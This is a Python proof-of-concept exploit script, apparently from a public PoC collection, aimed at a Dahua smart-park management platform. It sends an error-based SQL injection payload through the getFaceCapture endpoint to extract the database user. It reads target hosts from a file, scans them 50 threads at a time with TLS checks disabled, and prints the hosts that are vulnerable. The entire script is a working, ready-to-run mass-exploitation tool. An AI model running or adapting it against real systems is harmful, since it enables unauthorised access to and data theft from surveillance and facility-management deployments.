#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# app="dahua-智慧园区综合管理平台"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 DaHua_Zhihuiyuanqu_getFaceCapture_Sql_Poc.py url.txt                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
requests.packages.urllib3.disable_warnings()
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Host":"%s" % host2
    }
    vulurl = url + '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--"%7D/extend/%7B%7D'
    try:
        r = requests.get(vulurl, headers=headers,verify=False)
        #print(str(r.content))
        if  "XPATH" in str(r.content):
            index=str(r.content).find("XPATH")
            print("http://"+host+" :true   "+str(r.content)[index+23:index+38])
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])